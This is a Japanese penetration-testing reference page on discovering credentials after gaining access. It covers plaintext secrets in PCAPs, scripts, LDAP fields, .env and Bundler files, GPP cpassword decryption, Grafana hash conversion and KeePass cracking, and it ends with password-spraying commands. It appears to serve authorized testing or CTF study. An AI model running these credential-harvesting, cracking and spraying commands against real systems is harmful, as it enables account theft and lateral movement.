# 認証情報の発見

> **スコープ**: 様々な場所・形式で認証情報が露出しているパターンと、その取得手順をまとめる。シェル取得後・ファイルアクセス後に「認証情報がどこに隠れているか」を発見する技術を集約する。

## 着火条件

以下のいずれかの状況で、認証情報が漏洩している可能性がある:

| パターン | 着火条件 |
|---------|---------|
| §1 PCAP から平文認証情報 | PCAP ファイルが取得できた（FTP / HTTP 等の平文通信を含む可能性）|
| §2 スクリプトへの平文埋め込み | SYSVOL / スクリプトファイル（.bat / .ps1 等）が取得できた |
| §3 LDAP カスタム属性への平文保存 | LDAP 認証情報があり属性を列挙できる |
| §4 バイナリ・設定ファイルへのハードコード | 実行ファイルや設定ファイルが取得できた |
| §5 Web アプリ内部 DB からハッシュ取得 | パストラバーサル等でアプリのデータディレクトリにアクセスできた |
| §6 GPP cpassword（Group Policy Preferences）| SYSVOL に Groups.xml が存在し cpassword 属性がある |
| §7 Web アプリの .env ファイル | Web サーバーの公開ディレクトリにシェルでアクセスできた |
| §8 Bundler `.bundle/config` | Ruby アプリのプロセス（ruby / unicorn 等）としてシェルを取得済み |
| §9 KeePass データベース（.kdbx）のクラック | .kdbx ファイルを取得できた |

## 環境前提

- 実行環境: テスター端末（Linux）およびターゲット（シェルあり）
- 必要なツール:
  - `tshark`（Wireshark の CLI 版、ペネトレ用 Linux ディストリ標準搭載）
  - `sqlite3`（標準搭載）
  - `gpp-decrypt`（ペネトレ用 Linux ディストリ標準搭載）
  - `keepass2john`・`hashcat`・`john`（ペネトレ用 Linux ディストリ標準搭載）
  - `kpcli`（KeePass CLI、`apt install kpcli`）
  - `firepwd`（Firefox 用、`pip install firepwd`）

---

## 1. PCAP ファイルからの平文認証情報

FTP / HTTP / Telnet など平文通信プロトコルのトラフィックが含まれる PCAP から認証情報を抽出する。FTP は認証情報を完全に平文で送信する。

**コマンド:**

```bash
# [Attacker] FTP の認証情報を抽出
tshark -r capture.pcap -Y "ftp" -T fields -e frame.number -e ftp.request.command -e ftp.request.arg

# [Attacker] HTTP Basic 認証を抽出
tshark -r capture.pcap -Y "http.authorization" -T fields -e http.authorization

# [Attacker] strings での簡易抽出（大きな PCAP でも高速）
strings capture.pcap | grep -i "user\|pass\|login\|auth" | head -50
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|------|------|--------------|
| `PASS [PASSWORD]` | FTP パスワードが平文で見える | 前後の `USER` 行とセットで記録 → §末尾「必ず試すこと」へ |
| `Authorization: Basic [BASE64]` | HTTP Basic 認証 | `echo '[BASE64]' \| base64 -d` で復号 |
| https トラフィックのみ | 復号不可 | 鍵なし前提で平文プロトコルのみを対象にする |

**注意:** `PASS` コマンドの引数がパスワード。空パスワードでも `PASS` 行は出るため、前後の `USER` 行とセットで確認する。

---

## 2. スクリプトファイルへの平文パスワード埋め込み

管理者がユーザー作成等を自動化するスクリプトに、パスワードを平文で記述しているケースを狙う。

**コマンド:**

```bash
# [Attacker] ダウンロードしたスクリプトを確認
cat users.bat
# 典型的なパターン: net user [USERNAME] [PASSWORD]

# [Target] Windows 側でスクリプト全体を一括検索
findstr /si password *.xml *.ini *.txt *.bat *.ps1 *.vbs

# [Attacker] Linux 側での対応
grep -risE 'pass(word)?=' /path/to/scripts/
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|------|------|--------------|
| `net user [USER] [PASS]` のような行 | 平文パスワードが埋め込まれている | そのままドメインユーザーとして認証を試みる |
| スケジュールタスク XML に `-password` 引数 | タスク実行時に平文パスワードが渡される | XML の `Arguments` 要素を確認 |

**注意:** SYSVOL はドメイン参加ユーザーなら誰でも読めるのが既定。低権限アカウントからの横展開の糸口になる。

---

## 3. LDAP カスタム属性への平文パスワード保存

Active Directory の `info` フィールドや `description` フィールドに、管理者が一時パスワードや初期パスワードをメモとして記録しているケース。

**コマンド:**

```bash
# [Attacker] LDAP で info / description 属性を列挙
ldapsearch -x -H ldap://[DC_IP] -D "[USER]@[DOMAIN]" -w '[PASSWORD]' \
  -b "DC=[DOMAIN_DC],DC=[TLD]" "(objectClass=user)" \
  sAMAccountName info description \
  | grep -i "info\|description"
```

詳細: `../01_Reconnaissance/LDAP_Enumeration.md`

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|------|------|--------------|
| `info: TempPassword123` のような値 | 一時パスワードが平文で記載 | `userAccountControl` に `PASSWORD_EXPIRED` が立っていないか確認 → 認証試行 |
| 暗号文っぽい文字列 | 別フィールドに鍵が書かれている可能性 | `extensionAttribute1` 等を追加で確認 |

**注意:** `info` は GUI の「説明」欄とは別の目立たないフィールド。見落とされやすい分だけ平文パスワードが残りやすい。

---

## 4. バイナリ・設定ファイルへのハードコード

実行ファイルや設定ファイルに認証情報が直接書き込まれているケース。

**コマンド:**

```bash
# [Attacker] 設定ファイルを優先確認（バイナリ解析より速い）
cat web.config       # .NET / IIS 系
cat appsettings.json # .NET Core 系
cat .env             # PHP / Node.js / Laravel / Django 系
cat docker-compose.yml

# [Attacker] strings でバイナリから抽出
strings [binary_file] | grep -i "pass\|user\|key\|secret\|token\|ldap"
strings -e l [binary_file] | grep -i "pass\|user"  # UTF-16LE（Windows バイナリ）
```

→ .NET バイナリの逆コンパイル・XOR 復号・RC4 復号等の詳細: `./Binary_Analysis.md`

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|------|------|--------------|
| `password=`, `pwd:`, `apikey=` のような代入形式 | ハードコード認証情報 | そのまま認証情報として試す |
| `ldap://` / `smb://` 等の URL | 接続先サーバーの特定 | その接続先に対してアクセス経路を検討 |
| `mscoree.dll` / `.NETFramework` | .NET バイナリ確定 | `./Binary_Analysis.md` でさらに深掘り |

**注意:** `.env` が見つからない場合は `config.php`, `database.yml`, `appsettings.json`, `docker-compose.yml` 等も確認する。

---

## 5. Web アプリの内部データベースからハッシュを取得

Web アプリが SQLite や MySQL を使って認証情報を保存しているケース（Grafana / WordPress / Gitea 等）。

**コマンド:**

```bash
# [Attacker] SQLite テーブル一覧を確認
sqlite3 [FILE].db ".tables"

# ユーザー関連テーブルを確認
sqlite3 [FILE].db "SELECT * FROM user LIMIT 5;"
sqlite3 [FILE].db "PRAGMA table_info(user);"
```

**Grafana（PBKDF2-HMAC-SHA256）の場合:**

```bash
# [Attacker] ユーザー情報の取得
sqlite3 grafana.db "SELECT id, name, login, email, password, salt FROM user;"
# 出力例: 1||admin|admin@localhost|[HEX_HASH]|[SALT]
```

```python
# [Attacker] Hashcat (mode 10900) 形式に変換
import base64, binascii

salt = b'[SALT_STRING]'
hash_hex = '[HEX_HASH]'
hash_bytes = binascii.unhexlify(hash_hex)
print(f'sha256:10000:{base64.b64encode(salt).decode()}:{base64.b64encode(hash_bytes).decode()}')
```

→ 変換後ハッシュのクラック: `../05_Tools_Reference/Hashcat.md`（mode 10900）

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|------|------|--------------|
| `password` フィールドが HEX 文字列 | PBKDF2 ハッシュ（Grafana 等） | Python で base64 変換 → hashcat mode 10900 |
| `password` フィールドが `$2a$` / `$2b$` で始まる | bcrypt（Grafana 9.x 以降等） | hashcat mode 3200 |
| `salt` が別カラムにある | ハッシュとセットで取得必須 | `SELECT password, salt FROM user` でセット取得 |

**注意:** ハッシュが HEX 文字列で保存されている場合、Hashcat に渡す前に base64 形式に変換が必要。

---

## 6. GPP (Group Policy Preferences) の cpassword

SYSVOL の `Policies/{GUID}/MACHINE/Preferences/Groups/Groups.xml` に `cpassword=` 属性が存在する場合、ツール 1 コマンドで平文に復元できる。

> 原理（AES 暗号化されていても復号できる理由・MS14-025 後の挙動）→ `../06_Concepts/GPP_Credential.md`

**コマンド:**

```bash
# [Attacker] gpp-decrypt（ペネトレ用 Linux ディストリ標準搭載）
gpp-decrypt '[cpassword 属性の値]'
# → 平文パスワードが出力される
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|------|------|--------------|
| 平文パスワードが出力される | GPP 認証情報取得成功 | `userName` 属性のアカウントで認証試行 → §末尾「必ず試すこと」へ |
| `action="U"` の XML | 既存アカウントの更新。現在も有効なパスワードの可能性が高い | 優先的に試行する |

**注意:** `Groups.xml` 以外にも `Services.xml`, `ScheduledTasks.xml`, `Printers.xml`, `Drives.xml` に同様の `cpassword` が含まれる場合がある。

→ 詳細な取得手順: `../01_Reconnaissance/SMB_Enumeration.md`（GPP セクション）

---

## 7. Web アプリの .env ファイルからの認証情報取得

PHP / Node.js / Laravel / Django 等のフレームワークの `.env` ファイルに DB 認証情報・API キー・シークレットキー等が平文で格納されているケース。

**コマンド:**

```bash
# [Target] Web ルートの直下を確認（最優先）
ls -la /var/www/html/
cat /var/www/html/.env

# フレームワーク特有のパス
cat /var/www/[アプリ名]/.env
cat /opt/[アプリ名]/.env
```

`.env` が見つかったら以下を確認する（フォーマット例）:

```
DB_HOST=127.0.0.1
DB_DATABASE=app_prod
DB_USERNAME=admin
DB_PASSWORD=[PASSWORD]   ← OS ユーザーでも使われている可能性
APP_KEY=base64:...       ← アプリの暗号化キー
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|------|------|--------------|
| `DB_PASSWORD=` が平文で書かれている | 設定ファイルに直接記載 | `/etc/passwd` で OS ユーザーを確認 → `su [USER]` で使い回し試行 |
| `.env` が見つからない | 別パスに存在 / 保護設定済み | `.env.production`, `.env.local`, `config.php`, `database.yml` も確認する |

**注意:** `.env` はデフォルトで隠しファイル（`.` 始まり）のため `ls` だけでは見えない。`ls -la` で確認する。

---

## 8. Bundler 設定ファイル（`.bundle/config`）からの認証情報取得

Ruby / Rails アプリのサーバープロセスとしてシェルが取れた場合に、ホームディレクトリの `.bundle/config` にプライベート Gem リポジトリへの認証情報が平文保存されていることがある。

**コマンド:**

```bash
# [Target] ホームディレクトリの確認
ls -la ~/
cat ~/.bundle/config

# 他ユーザーのホームディレクトリも確認（権限があれば）
for user in $(ls /home/); do echo "=== $user ==="; cat /home/$user/.bundle/config 2>/dev/null; done
```

**出力例:**

```yaml
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: "[USER]:[PASSWORD]"
```

フォーマット: `[USERNAME]:[PASSWORD]` 形式で平文保存。`__` はURLの `.`（ドット）を表す Bundler のエスケープ規則。

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|------|------|--------------|
| `[USER]:[PASSWORD]` 形式のエントリ | プライベート Gem リポジトリの認証情報 | `[USER]` が OS ユーザー名と一致するなら `su [USER]` で使い回し試行 |

**注意:** `.bundle/` ディレクトリは `ls -la` でないと見えない。ファイルの権限がグループ・ワールド読み取り可能なことがある。

---

## 9. KeePass データベース（.kdbx）のクラック

ターゲットのファイルシステム上に `.kdbx` ファイルが存在する場合、マスターパスワードをクラックできれば内部の全認証情報にアクセスできる。

**攻撃者の思考トレース:** パスワードマネージャーは「認証情報の集約ポイント」。マスターパスワードが弱ければ、一度クラックするだけで多数のサービスへのアクセスを得られる。優先度の高い発見物。

**コマンド:**

```powershell
# [Target] Windows シェルから転送
certutil -encode C:\Users\[USER]\Desktop\credentials.kdbx C:\Temp\credentials.b64
```

```bash
# [Attacker] テスター端末でデコード
cat credentials.b64 | base64 -d > credentials.kdbx

# keepass2john でハッシュを抽出
keepass2john credentials.kdbx > keepass_hash.txt

# hashcat でクラック（mode 13400 = KeePass）
hashcat -m 13400 keepass_hash.txt /usr/share/wordlists/rockyou.txt

# または john を使う
john --wordlist=/usr/share/wordlists/rockyou.txt keepass_hash.txt
john --show keepass_hash.txt

# クラック後: kpcli でデータベースを開く
kpcli --kdb=credentials.kdbx
# kpcli 内コマンド: ls / cd [path] / show [entry] / quit
```

**KeePass 認証方式と対応:**

| 認証方式 | クラック可否 |
|---------|------------|
| マスターパスワードのみ | 可（keepass2john → hashcat mode 13400）|
| パスワード + キーファイル | キーファイルも入手できれば可（`-k [keyfile]`）|
| Windows ユーザーアカウント認証 | 難易度高（該当 Windows ユーザーとして実行が必要）|

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|------|------|--------------|
| hashcat に `Cracked` 表示 | マスターパスワードが判明 | kpcli でデータベースを開いて全エントリを確認 |
| wordlist で解析できない | マスターパスワードが強固 | `hashcat -r rules/best64.rule` / 別経路でパスワードを探す（note.txt 等）|
| `keepass2john` エラー | `.kdbx` が破損 / 別の `.kdbx` が存在 | `find / -name "*.kdbx" 2>/dev/null` で別ファイルを探す |

**注意:** KeePass のマスターパスワードは長い・複雑なケースが多く、簡単な wordlist ではクラックできないことがある。時間の読みが重要。

---

## 刺さらなかったとき

| 状況 | 対処 |
|------|------|
| PCAP に暗号化トラフィックしかない | 鍵なし前提で平文プロトコル（FTP / HTTP / Telnet）のみを対象にする |
| `strings` でパスワードが見つからない | UTF-16LE エンコード漏れ。`strings -e l` を併用する |
| `.env` ファイルが見つからない | `.env.production`, `.env.local`, `config.php`, `database.yml`, `appsettings.json` も確認する |
| GPP cpassword が存在しない | MS14-025 適用済みでも古いポリシーが残存している場合あり。全 XML を `grep -r "cpassword" /path/to/sysvol/` で確認 |
| KeePass が解析できない | キーファイルが別途必要。`keepass2john -k [keyfile] credentials.kdbx` を試す |
| LDAP の info / description が空 | `extensionAttribute1`-`15` / `adminDescription` 等の追加属性も確認する |

---

## 認証情報を取得したら必ず試すこと

取得した認証情報は、判明している**すべてのサービス**で試す（パスワード使い回し確認）:

```bash
# [Attacker] SMB / WinRM / MSSQL / LDAP を一括確認
nxc smb [TARGET] -u [USER] -p '[PASSWORD]' --continue-on-success
nxc winrm [TARGET] -u [USER] -p '[PASSWORD]'
nxc mssql [TARGET] -u [USER] -p '[PASSWORD]'

# [Attacker] SSH
ssh [USER]@[TARGET]

# [Attacker] 複数ユーザーへのスプレー（1 パスワードが複数ユーザーに使われている場合）
nxc smb [TARGET] -u users.txt -p '[PASSWORD]' --continue-on-success
```

---

## 関連技術

- 前：PCAP から FTP 認証情報 → 同じ認証情報を SSH で試す → `./FTP.md`・`./SSH.md`
- 前：LDAP 認証情報で LDAP にアクセス → `../01_Reconnaissance/LDAP_Enumeration.md`
- 前：バイナリから認証情報 → `./Binary_Analysis.md`
- 前：Web アプリのファイル読み取りで DB を取得 → `./Web_Vulnerabilities/Path_Traversal.md`
- 前：`.env` / `.git/` / `.htpasswd` 等の誤公開から認証情報を取得 → `../01_Reconnaissance/Exposed_Files.md`
- 前：GPP cpassword の取得手順 → `../01_Reconnaissance/SMB_Enumeration.md`（GPP セクション）
- 後：Grafana ハッシュのクラック → `../05_Tools_Reference/Hashcat.md`
- 後：取得したパスワードを使った sudo 悪用 → `../03_Post_Access_Linux/Sudo_Misconfig.md`
- 後：取得済みパスワードの使い回し確認スプレー前にロックアウトポリシーを確認 → `./Account_Lockout_Recon.md`
- 後：取得した cred / 秘密鍵を SSH で試行 → `./SSH.md`
- 参照：GPP cpassword の動作原理（AES 鍵公開・MS14-025）→ `../06_Concepts/GPP_Credential.md`
